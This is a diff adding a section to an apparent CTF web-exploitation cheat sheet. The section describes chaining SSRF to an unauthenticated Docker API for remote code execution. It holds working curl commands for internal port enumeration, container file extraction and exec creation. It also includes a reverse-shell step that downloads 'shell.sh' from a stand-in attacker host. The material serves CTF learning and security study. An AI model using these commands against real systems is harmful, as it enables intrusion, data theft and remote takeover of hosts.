@@ -48,6 +48,7 @@
 - [Flask/Werkzeug Debug Mode Exploitation](#flaskwerkzeug-debug-mode-exploitation)
 - [XXE with External DTD Filter Bypass](#xxe-with-external-dtd-filter-bypass)
 - [Path Traversal: URL-Encoded Slash Bypass](#path-traversal-url-encoded-slash-bypass)
+- [SSRF → Docker API RCE Chain (H7CTF 2025)](#ssrf--docker-api-rce-chain-h7ctf-2025)
 
 ---
 
@@ -614,3 +615,64 @@ curl "http://target/?view_receipt=secret_XXXXXXXX"
 ```
 
 **Key insight:** `basename()` is NOT a security function -- it only extracts the filename component. It doesn't filter hidden files (`.foo`), backup files (`file~`), or any filename without directory separators.
+
+---
+
+## SSRF → Docker API RCE Chain (H7CTF 2025)
+
+**Pattern (Moby Dock):** Web app with SSRF vulnerability exposes unauthenticated Docker daemon API on port 2375. Chain SSRF through an internal proxy endpoint to relay POST requests and achieve RCE.
+
+**Step 1 — Discover internal services via SSRF:**
+```bash
+# Enumerate localhost ports through SSRF
+curl "http://target/validate?url=http://localhost:2375/version"
+curl "http://target/validate?url=http://localhost:8090/docs"
+```
+
+**Step 2 — Extract files from running containers via Docker archive endpoint:**
+```bash
+# List containers
+curl "http://target/validate?url=http://localhost:2375/containers/json"
+
+# Read files from container filesystem (returns tar archive)
+curl "http://target/validate?url=http://localhost:2375/v1.51/containers/<container_id>/archive?path=/flag.txt"
+```
+
+**Step 3 — Execute commands via Docker exec API (requires POST relay):**
+
+When SSRF only allows GET requests, find an internal endpoint that can relay POST requests (e.g., `/request?method=post&data=...&url=...`).
+
+```bash
+# 1. Create exec instance
+curl "http://target/validate?url=http://localhost:8090/request?method=post\
+&data={\"AttachStdout\":true,\"Cmd\":[\"cat\",\"/flag.txt\"]}\
+&url=http://localhost:2375/v1.51/containers/<id>/exec"
+# Returns: {"Id": "<exec_id>"}
+
+# 2. Start exec instance
+curl "http://target/validate?url=http://localhost:8090/request?method=post\
+&data={\"Detach\":false,\"Tty\":false}\
+&url=http://localhost:2375/v1.51/exec/<exec_id>/start"
+```
+
+**For reverse shell access:**
+```bash
+# 1. Download shell script into container
+# Cmd: ["wget", "http://attacker/shell.sh", "-O", "/tmp/shell.sh"]
+
+# 2. Execute with sh (not bash — busybox containers lack bash)
+# Cmd: ["sh", "/tmp/shell.sh"]
+```
+
+**Key Docker API endpoints for exploitation:**
+| Endpoint | Method | Purpose |
+|----------|--------|---------|
+| `/version` | GET | Confirm Docker API access |
+| `/containers/json` | GET | List running containers |
+| `/containers/<id>/archive?path=<path>` | GET | Extract files (tar format) |
+| `/containers/<id>/exec` | POST | Create exec instance |
+| `/exec/<id>/start` | POST | Run exec instance |
+| `/images/json` | GET | List available images |
+| `/containers/create` | POST | Create new container |
+
+**Key insight:** Unauthenticated Docker daemons on port 2375 give full container control. When SSRF is GET-only, look for internal proxy or request-relay endpoints that forward POST requests. Use `sh` instead of `bash` in minimal containers (busybox, alpine).
